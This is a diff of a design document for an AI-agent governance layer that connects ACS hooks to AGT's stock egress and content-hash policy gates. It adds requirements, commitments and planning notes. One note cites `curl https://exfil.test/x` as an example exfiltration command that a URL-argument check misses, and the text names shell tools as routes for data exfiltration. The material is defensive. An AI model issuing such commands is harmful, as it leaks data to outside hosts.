@@ -71,6 +71,9 @@ This qualifies **R1.3**: the four snapshot-borne members are constructible from 
 | R1.7 | 🟡 Wire-delivery failure applies the negotiated `on_decision_failure` posture (ACS default `proceed`) with every fail-open proceed audited — never conflated with AGT's evaluation-layer fail-closed. Delivery means the Guardian stayed silent, the transport died, or an error arrived whose code carries no verdict and does not say the Guardian refused | Must-have |
 | R1.8 | 🟡 The three ACS mandatory fail-closed cases hold: malformed `modifications`, `DEFER` expiry, `ASK` expiry | Must-have |
 | R1.9 | 🟡 **Added by review after V3 shipped.** A refusal is not a delivery failure: an error whose code says the Guardian was alive and REFUSED the envelope (`-32700`, `-32010`, `-32011`, `-32020`) is a governance outcome and denies **regardless of posture**, still audited. Filing these under R1.7 meant the shipped default (`proceed`) turned the Guardian's own "no" into `allow`. An unrecognised error code stays a delivery failure and keeps the posture — deliberately, since widening this to every error object would fail closed on an error the Guardian never sent | Must-have |
+| R1.10 | 🟡 Every AGT stock gate class is either reachable in this deployment or carries a named reason it is not | Must-have |
+| R1.11 | 🟡 A tool whose arguments do not match the manifest's single `policy_target` is evaluated, not failed closed on a missing path — and a transform lands on **that tool's** argument, never on a literal that names another tool's | Must-have |
+| R1.12 | 🟡 Egress is decided for the tool the threat actually uses, not only for the tool whose arguments happen to name a destination | Must-have |
 | **R2** | 🟡 **Interop is real, and stays real** | Must-have |
 | R2.1 | AGT's published policy library decides, used as shipped — driven only through `data.agt.defaults.config` | Must-have |
 | R2.2 | AGT's engine runs unforked, at a pinned upstream version | Must-have |
@@ -97,7 +100,7 @@ This qualifies **R1.3**: the four snapshot-borne members are constructible from 
 | R5.1 | Every hook firing is inspectable as an ACS envelope, not buried in library internals | Must-have |
 | R5.2 | An ACS-first reader can trace one action end to end without reading AGT source | Must-have |
 | R5.3 | Declares which ACS profiles it claims and which it does not | Must-have |
-| R5.4 | Which `steps/*` hooks the implementation instruments | Undecided |
+| R5.4 | 🟡 Which `steps/*` hooks the implementation instruments — `steps/toolCallRequest` and `steps/toolCallResult` through V8; `steps/skillLoad` added by V10 | **Decided** (V9/V10 planning) |
 | **R6** | **The stateless/stateful split holds** | Must-have |
 | R6.1 | AGT's engine stays stateless — complete policy input per decision | Must-have |
 | R6.2 | Session state (SessionContext, Intent, lineage) lives in the ACS Guardian layer | Must-have |
@@ -109,7 +112,8 @@ This qualifies **R1.3**: the four snapshot-borne members are constructible from 
 | **R8** | **Headroom is visible, but it is not the pitch** | Leaning yes |
 | R8.1 | 🟡 ACS provenance carries the IFC labels AGT's `result_labels` explicitly delegates to the host | Leaning yes |
 | R8.2 | Unconsumed hooks cost AGT nothing — an AGT-profile host ignores them cleanly | Must-have |
-| R8.3 | Whether the demo runs an actual policy over an ACS-only hook, or just shows the surface exists | Undecided |
+| R8.3 | 🟡 Whether the demo runs an actual policy over an ACS-only hook, or just shows the surface exists — **runs one.** V10 drives AGT's stock `content_hash` gate from `steps/skillLoad`, a hook no AGT host package has | **Decided** (V10 planning) |
+| R8.4 | 🟡 A control ACS carries for a component class AGT's own hosts have no hook for is decided by AGT's unforked rule | Leaning yes |
 
 ---
 
@@ -161,6 +165,11 @@ The runtime exists, but the artifact Microsoft reads is a machine-checked mappin
 | **C4** | Guardian service, session layer, and AGT bridge, as A2–A4 | |
 | **C5** | Published artifact = mapping table + coverage matrix; the running demo is the proof it holds | |
 | **C6** | Upstream contract watch: the same harness runs on a schedule against AGT `main`. A reported surface diff names the changed intervention point, verdict, or schema field | |
+| **C7** | 🟡 **Reach AGT's stock `egress` gate.** Two routes, both built (V9) | |
+| C7.1 | Govern a tool whose ACS `arguments` already name a destination. `assemblePreToolCallSnapshot` unwraps `arguments.url.value` to `tool_call.args.url`, which is `egress.rego`'s **first** default destination path — so this is one `data.json` key and one manifest `tools:` entry, with no code and no Rego | |
+| C7.2 | Extract a destination from `raw_command` in a Guardian annotator, returning `{destination}` to `input.annotations.egress` — `egress.rego`'s **fifth** default path. Covers the shell tools C7.1 cannot, at the cost of a Guardian-originated value | |
+| **C8** | 🟡 **Reach AGT's stock `content_hash` gate from `steps/skillLoad`** (V10). `tool_call.name` ← `skill_id`, `tool_call.content_hash` ← `digest.value`; the approved digest is declared on the manifest's tool entry, which AGT's `$defs/tool` permits (`additionalProperties: true`) and the SDK carries through to `input.tool` | |
+| **C9** | 🟡 **One normalised `policy_target` leaf, declared once in `mapping.yaml` and read twice** (V9). AGT's `intervention_point` is `additionalProperties: false` with exactly one `policy_target`, so a second tool shape is otherwise denied on `runtime_error:path_missing`. The same entry names the argument a `transform` lands back on, replacing `into_argument`'s literal — one declaration, because two would disagree | |
 
 ⚠️ **C5 said "test matrix".** That was a third name for the 8 × 5 — U30's `CoverageMatrix`, which N47 `renderCoverageMatrix()` publishes — in the one commitment whose subject is which two artifacts get published. `slices/v7/README.md` commitment 2 freezes the three names apart: `Mapping` is S10's data, `MappingTable` is U32's rendering of it, `CoverageMatrix` is U30's measurements. C5 names the two published artifacts, so it uses the two published names (PR #16 review).
 
@@ -191,13 +200,41 @@ Post-spike. All flags cleared, so the check now discriminates.
 - ⚠️ **R1.3 is qualified, discovered during V3 planning — and no verdict moves.** Four of AGT's five policy-input members come from the snapshot the Guardian assembles; `annotations` comes from a manifest-declared annotator instead, and the ACS v0.1.0 wire carries no field a drift or confidence score could be derived from (evidence under Verified ground). So "the AGT policy input's five members are constructible from an ACS envelope" is true of four and Guardian-originated for the fifth. This does not move R1 in any column: A and B assert expressibility and still do not prove it; C still proves it case by case, and the qualification becomes one more resolved cell in C2's matrix — `guardian_only`, the status V7 gives a cell the Guardian can resolve from process-local knowledge and a wire consumer cannot — which is the honest result C2 exists to produce. It is a note about ACS v0.1.0's coverage, not about AGT, so R4 is untouched.
 - ✅ **R3.8 confirms, discovered during V4 planning — and no verdict moves.** F1 is resolved: a capability AGT's own Claude Code package scopes out ("`PostToolUse` … cannot reliably redact tool output", README:39, under *Important parity gaps*) is reachable through the contract. R3 was already ✅ in all three columns on R3.1–R3.7, so this closes the one 🟡 beneath it without changing a cell. **R4 is untouched, and the reason matters:** the package's wording is "cannot **reliably**", and V4's evidence is what makes that wording exactly right — a replacement not matching the tool's own output schema is silently discarded and the original delivered. So the finding is that meeting the reliability condition is a contract-level job done once for every runtime, not a defect in a per-host module. That is R4.3's framing holding under the one requirement most able to break it.
 - ⚠️ **R1.4 is qualified, discovered during V7 planning — and no verdict moves.** Two facts, both measured against the pinned SDK rather than read from AGT's docs. First: `enforced_identity` is the SHA-256 of the key-sorted, whitespace-free JSON of the policy input after **`policy_target.value` alone** is replaced by the transform — the snapshot's own copy of that leaf is not updated, so AGT's identity binds to the policy target it rewrote, not to the document the host will execute. Second: **ACS v0.1.0 carries no action-identity field on any of its 43 schemas** (`identity` occurs twice in the whole spec directory, as `session-start.json`'s `user_identity` and as prose in `skill-register.json`). So "survives the adapter" is true Guardian-side and untrue on the wire, and no slice can make it true without a v0.2 field. This does not move R1 in any column, for the same reason R1.3's qualification did not: A and B assert and do not prove; C proves case by case, and the qualification becomes a resolved cell in C2's matrix — `guardian_only`, in the vocabulary V7 published. That is the third finding to land on that shape, after R1.3's `annotations` and D10's Trace attributes, and the three together are what V7 publishes: **v0.1.0's response envelope carries a decision, and never has to carry the evidence for it.** A note about ACS v0.1.0's coverage, not about AGT, so R4 is untouched. ⚠️ *This sentence read "but not the evidence for it" until V7's execution measured D10 and found `AcsResult.metadata` already declares exactly `evaluator`, `evaluator_version`, `evaluation_duration_ms`, `model_id` and `confidence` — five members, all optional, under an optional `metadata`. ⚠️ Corrected again after the final review: that first correction over-generalised. **One of the three is optionality and two are absence** — D10's Trace attributes exist and are never required, while R1.3's `annotations` input and R1.4's identity have no field on the wire at all. The finding the three share is not one mechanism but one consequence: a wire consumer cannot rely on the evidence, twice because it is absent and once because it is optional. That is why the v0.2 ask is "require the ones already there, and add the ones that are not."*
+- 🟡 **R1.9–R1.11 and R8.4 are added by V9/V10 planning — and no verdict moves.** All four are properties of the deployment C describes, measured in `spike-unreached-gates.md`: which AGT gate classes this bundle's configuration reaches, what a single `policy_target` does to a second tool shape, and whether an ACS-only hook can drive an unforked AGT rule. A and B would carry the same facts and still assert rather than prove them, which is what R1 has failed them on since the first check. C absorbs all four into C7–C9 and into cells of C2's matrix. The one that could have moved a verdict is **R1.10**, because it names a live fail-closed defect (a benign call denied on `runtime_error:path_missing`, and a redaction emitted against an argument the tool does not have) rather than a coverage note — but it is a defect of *this deployment's manifest and mapping*, reachable in every column, and C is the only shape whose harness would have caught it. R4 is untouched: nothing here is a fact about AGT.
+- 🟡 **R1.11 is what splits C7 into two parts rather than one.** C7.1 is the stronger *claim* — the destination is constructible from the ACS envelope alone, so C2's matrix records the cell `expressed` — and it is measured working with zero code and zero Rego. But it only ever covers tools that happen to name a destination in their arguments, and shell egress (`curl`, `wget`, `git push`) is how exfiltration actually happens. C7.2 covers those, at the price of a Guardian-originated annotation, so its cell is `guardian_only` — the same status R1.3's `annotations` and R1.4's identity already carry. Building only one would mean either a claim with no threat behind it or a demo with a weaker claim than the wire supports, so C carries both and the matrix records them as two different colours of the same gate.
 - ⚠️ **A4's SDK choice is load-bearing for R1.4, discovered during V1 planning.** AGT's PyO3 binding surfaces only `action_identity`, collapsing `input_identity` and `enforced_identity`; the Node binding serializes both. Every shape embeds A4, so on the Python SDK R1.4 ("`enforced_identity` survives the adapter") would be unverifiable in *all three* columns and C's R1 ✅ would not survive contact with C2's harness. A4 is amended to the Node SDK and the verdicts stand as written. No other row moves.
+
+## C7: Reaching the egress gate
+
+Both alternatives measured against the unforked bundle in
+`spike-unreached-gates.md`. **Both are built** — the check below is what says
+why neither alone is enough, not which one wins.
+
+| Req | Requirement | Status | C7.1 | C7.2 |
+|-----|-------------|--------|------|------|
+| R1.3 | The AGT policy input's five members are constructible from an ACS envelope | Must-have, qualified | ✅ | ❌ |
+| R1.9 | Every AGT stock gate class is either reachable in this deployment or carries a named reason it is not | Must-have | ✅ | ✅ |
+| R1.11 | Egress is decided for the tool the threat actually uses, not only for the tool whose arguments happen to name a destination | Must-have | ❌ | ✅ |
+| R2.1 | AGT's published policy library decides, used as shipped — driven only through `data.agt.defaults.config` | Must-have | ✅ | ✅ |
+
+**Notes:**
+- C7.1 fails R1.11: a `url` argument covers `WebFetch`, and nothing covers `curl https://exfil.test/x`.
+- C7.2 fails R1.3: the destination reaches policy as an annotation, and annotations are Guardian-originated by AGT's own design. The measured verdicts are identical either way; only the *provenance* of the destination differs, which is exactly what R1.3 is about.
 
 ---
 
 ## Spikes
 
-All resolved — see `spike-agt-integration.md`.
+All resolved — see `spike-agt-integration.md` and `spike-unreached-gates.md`.
+
+`spike-unreached-gates.md` (V9/V10 planning) answers eight questions about the
+two AGT stock gates ACS already addresses. Its four load-bearing findings:
+AGT's egress gate reads `snapshot.tool_call.args.url` first and the ACS wire
+already lands there; the manifest's single `policy_target` denies any tool
+without a `command` argument on `runtime_error:path_missing`; AGT's `$defs/tool`
+is `additionalProperties: true` so a manifest may declare a `content_hash` the
+SDK carries through to `input.tool`; and a manifest declaring an annotator the
+Guardian dispatches nothing for denies **every** call, benign ones included.
 
 | # | Spike | Outcome |
 |---|-------|---------|
@@ -269,12 +306,15 @@ All resolved — see `spike-agt-integration.md`.
 | N20 | P3 | guardian | `POST /acs` JSON-RPC 2.0 endpoint | call | → N21 | — |
 | N21 | P3 | guardian | `validateEnvelope()` against v0.1.0 schemas | call | → N22, → N27 | — |
 | N22 | P3 | guardian | `appendContextEntry()` — hash-chained SessionContext | call | → S3, → N23 | — |
-| N23 | P3 | guardian | `assemblePreToolCallSnapshot()` / `assemblePostToolCallSnapshot()` — envelope + session state → AGT snapshot, one function per intervention point | call | → N30 | — |
+| N23 | P3 | guardian | `assemblePreToolCallSnapshot()` / `assemblePostToolCallSnapshot()` — envelope + session state → AGT snapshot, one function per intervention point. 🟡 **V9 adds the normalised policy-target leaf** (from N54) and forwards `raw_command`, so one manifest `policy_target` serves every tool shape instead of denying all but one on `runtime_error:path_missing`. 🟡 **V10 adds `assembleSkillLoadSnapshot()`** as a third sibling: `tool_call.name` ← `skill_id`, `tool_call.content_hash` ← `digest.value` | call | → N30 | — |
 | N24 | P3 | guardian | `mapVerdict()` — AGT verdict **+ the resolved intervention point** → ACS decision; `warn` → `allow` + `policy_references`; `transform`'s `$policy_target` bound → the modification that point's own S10 row declares — `modifications.parameter_overrides` keyed by argument name at the request gate, `modifications.redactions` on the result payload's own path at the result gate (R1.6). A point S10 gives no synthesis rule cannot express a `transform` and throws, reaching the host as an honoured `deny` | call | → N25, → N26 | → N4, → N13 |
 | N25 | P3 | guardian | `persistIfcLabels()` — AGT `result_labels` into the `IfcLabels` field ACS provenance carries | call | → S5 | — |
 | N26 | P3 | guardian | `createEnvelopeLogSink()` → `sink.write()` — ⚠️ **total**: never throws, never alters a decision. Records the request *before* validation | call | → S6 | — |
 | N27 | P3 | guardian | `denyOnInvalidEnvelope()` — schema or bridge failure returns an explicit ACS `deny` **decision**, not a bare error, so the host honors it instead of falling back to posture | call | → N26 | → N4, → N13 |
 | N28 | P3 | guardian | `buildServerHello()` — ServerHello: `negotiated_version`, `methods_evaluated`, `selected_transport`, `timeout_config`, `on_decision_failure`. **`methods_evaluated` is the load-bearing one and V4 is what made it so**: it is exactly the set of methods this Guardian dispatches — both `steps/*` gates since V4 added the result one — and it is *checked against the dispatch* rather than trusted, because both directions are wrong and neither is cosmetic. A method declared here that no branch answers claims enforcement that does not exist; a method omitted tells a conformant client, in `handshake.json`'s own words, to treat that gate as ALLOW-by-default. `test/handshake-declares-what-it-evaluates.test.ts` derives the truth from a live Guardian. There is no `profiles_accepted` — this responder never shipped one | call | → N26 | → N5, → N14 |
+| N54 | P3 | guardian | 🟡 `resolvePolicyTargetArgument(toolName, mapping, point)` — the argument name this tool's policy target is read from and written back to. **One declaration read twice**: N23 uses it to fill the normalised snapshot leaf, N24 uses it to name the `parameter_overrides` key, and a `transform` therefore lands on the argument the call actually carries. It replaces `mapping.yaml`'s `into_argument` literal, which named `command` for every tool and would emit a `WebFetch` redaction against an argument `WebFetch` does not have — measured, and the same reported-applied-but-delivered-original family as risk rows 15 and 17 | call | → N23, → N24 | — |
+| N55 | P3 | guardian | 🟡 `annotateEgressDestination()` — the annotator dispatched for the manifest's `egress` entry; reads the step's `raw_command` and answers `{destination}`, which lands at `input.annotations.egress.destination`, `egress.rego`'s own fifth default path. Guardian-originated by AGT's design, exactly as the drift score is. **The Guardian must supply this dispatcher unconditionally**: a manifest declaring an annotator nothing dispatches denies every call with `runtime_error:annotation_failed`, benign ones included (measured) | call | → N30 | — |
+| N56 | P3 | guardian | 🟡 `assembleSkillLoadSnapshot()` — a third sibling beside N23's two, for `steps/skillLoad`: `tool_call.name` ← `skill_id`, `tool_call.content_hash` ← `digest.value`. Sibling rather than a mode, on the rule N23's own header states — each intervention point has its own snapshot shape, and this one shares no member with either tool-call snapshot but `envelope.budgets` | call | → N30 | — |
 | N30 | P3.1 | agt-bridge | `evaluateInterventionPoint(point, snapshot)` — Node SDK | call | — | → N24 |
 | N31 | P3.1 | agt-bridge | `AgentControl.fromPath(manifest.yaml)` at boot | call | — | → N30 |
 | N40 | P5 | conformance | `conformance` runner (`bun run conformance`) — every other package in this repo is a bare noun, so a fifth spelled as a full title would be the only one | call | → N41, → N42, → N43, → N44, → N49 | — |
@@ -307,7 +347,7 @@ All resolved — see `spike-agt-integration.md`.
 | S5 | P3 | `provenance` | `origin` / `derived_from` lineage, plus an `IfcLabels` field carrying AGT's labels between steps |
 | S6 | P3 | `envelope log` | JSONL of every request and response as parsed, unmodified, at `.acs/envelopes.jsonl` (gitignored — carries raw tool arguments). Paired by JSON-RPC `id` |
 | S7 | P3.1 | `manifest.yaml` | Binds the `rego` policy to `data.agt.defaults.verdict`; declares intervention points, tools, approval |
-| S8 | P3.1 | `data.agt.defaults.config` | Thresholds, allowlists, pattern lists — the only place policy behaviour is authored |
+| S8 | P3.1 | `data.agt.defaults.config` | Thresholds, allowlists, pattern lists — the only place policy behaviour is authored. 🟡 V9 adds `egress`, V10 adds `content_hash.enforce`, taking the reached gate classes from three to five. ⚠️ **`egress` must carry an explicit `allowlist`**: with the key absent, `egress.rego` falls back to `input.tool.security_labels`, which is `["shell"]` on every tool this manifest registers, and every destination is then denied |
 | S9 | P3.1 | AGT stock bundle | `policy/lib/*.rego` at the pinned ref. Requires the `opa` CLI on PATH |
 | S12 | P5 | upstream AGT surfaces | Wire schemas and enums fetched from `main` |
 
@@ -315,7 +355,7 @@ All resolved — see `spike-agt-integration.md`.
 
 | # | Store | Description | Read by |
 |---|-------|-------------|---------|
-| S10 | `mapping.yaml` | The normative ACS ↔ MS-ACS mapping (C1) | N23, N24 (runtime) and N41, N42, N48 (harness) |
+| S10 | `mapping.yaml` | The normative ACS ↔ MS-ACS mapping (C1). 🟡 V9 adds the per-tool policy-target argument table N54 resolves, which replaces `into_argument`'s literal | N23, N24, N54 (runtime) and N41, N42, N48 (harness) |
 | S11 | `agt.lock` | Pinned upstream AGT ref | N31 (bridge) and N46 (differ) |
 
 **S10 is the load-bearing design choice.** The same mapping file drives the runtime *and* the conformance harness. If the adapter and the claimed mapping ever diverge, the matrix goes red. That is what makes C1 a contract rather than documentation, and it is why C wins R1 in the fit check.
@@ -361,11 +401,14 @@ flowchart TB
         N21["N21: validateEnvelope()"]
         N22["N22: appendContextEntry()"]
         N23["N23: assemblePreToolCallSnapshot() / assemblePostToolCallSnapshot()"]
+        N56["N56: assembleSkillLoadSnapshot()"]
         N24["N24: mapVerdict()"]
         N25["N25: persistIfcLabels()"]
         N26["N26: createEnvelopeLogSink()"]
         N27["N27: denyOnInvalidEnvelope()"]
         N28["N28: buildServerHello()"]
+        N54["N54: resolvePolicyTargetArgument()"]
+        N55["N55: annotateEgressDestination()"]
         S3["S3: sessionContext chain"]
         S4["S4: intent"]
         S5["S5: provenance + IfcLabels"]
@@ -458,6 +501,12 @@ flowchart TB
     S5 -.-> N23
     S10 -.-> N23
     N23 --> N30
+    N22 --> N56
+    S10 -.-> N54
+    N54 -.-> N23
+    N54 -.-> N24
+    N56 --> N30
+    N55 --> N30
 
     S7 -.-> N31
     S8 -.-> N31
@@ -542,7 +591,7 @@ flowchart TB
 |---|----------|--------|----------------|
 | ~~D1~~ | R3.6 — confirm OpenCode as host #2, replacing Copilot CLI | ✅ **Decided: confirmed** (V5 planning) | Confirmed by running OpenCode **1.18.15**, not by reading it: the plugin API expresses both gates. ⚠️ *This row said "against an unchanged adapter" — planning's belief, disproved by execution: the adapter changed, two hookmap fields and four load-time gates were added, `loadHookmap` began normalising what it returns, and `governStep` took on the `tools` rule both shims share. (A count of changed files stood here and is gone: it went stale during the review round that followed, which is exactly what every other diff-stat figure in this repo did.) R3.4's real subject survives intact and is the stronger claim — **no per-host fork**, every line in the package both hosts run, host #1's source +0/−0. See the R3.4 Fit Check row.* The "sharpest architectural contrast with Claude Code" turned out to be sharper than this row assumed, and in a way that is the point — Claude Code's shim *writes a document*, OpenCode's hooks return `void` and *mutate what they are handed*, so the same rendered `HostOutput` is applied rather than printed. Two conditions attach, both recorded in §V5 and risk rows 17/18 |
 | D2 | R3.7 — swap the runtime too? | Decided: no | Keeps every arm one Microsoft recognizes; costs the vendor-neutrality demonstration |
-| D3 | R5.4 — hook coverage | Open | All 19 is a spec exercise; the 8 AGT consumes is the minimum that proves R1 |
+| ~~D3~~ | R5.4 — hook coverage | ✅ **Decided: the two tool-call hooks, plus `steps/skillLoad`** (V9/V10 planning) | The original reasoning stands and is what picks the third: the eight points AGT consumes are the minimum that proves R1, and coverage beyond them earns its place only by driving a real AGT rule rather than by existing. `steps/skillLoad` does exactly that — it carries a `digest` whose semantics `hooks/skill-load.json` spells out clause for clause as what `policy/lib/content_hash.rego` decides, and no AGT host package has a hook for it. So this is not "one more of the nineteen": it is the first hook where an ACS-only surface drives AGT's unforked bundle, which is R8.3's own question answered by building it. ⚠️ *V9/V10 planning first wrote the denominator as 22 and called V1's 19 stale. Both counts are right for different sets — 22 is every hook payload schema, 19 is the `steps/*` subset, and R5.4 asks about `steps/*` — so V1's figure stands and the claim is three of nineteen. §V10 carries both counts and names the three non-`steps` schemas* |
 | D4 | R1.1 — spec `steps/modelCall` for v0.2 as part of this work, or map AGT's two model-call points onto existing hooks and declare the seam | Open | Decides whether this is an implementation project or a spec-and-implementation project |
 | D5 | R7.3 — determinism | Open | A scripted transcript demos reliably; a live model demos honestly |
 | D6 | Shape selection | **Decided: C** | C is the only shape that proves R1 rather than asserting it |
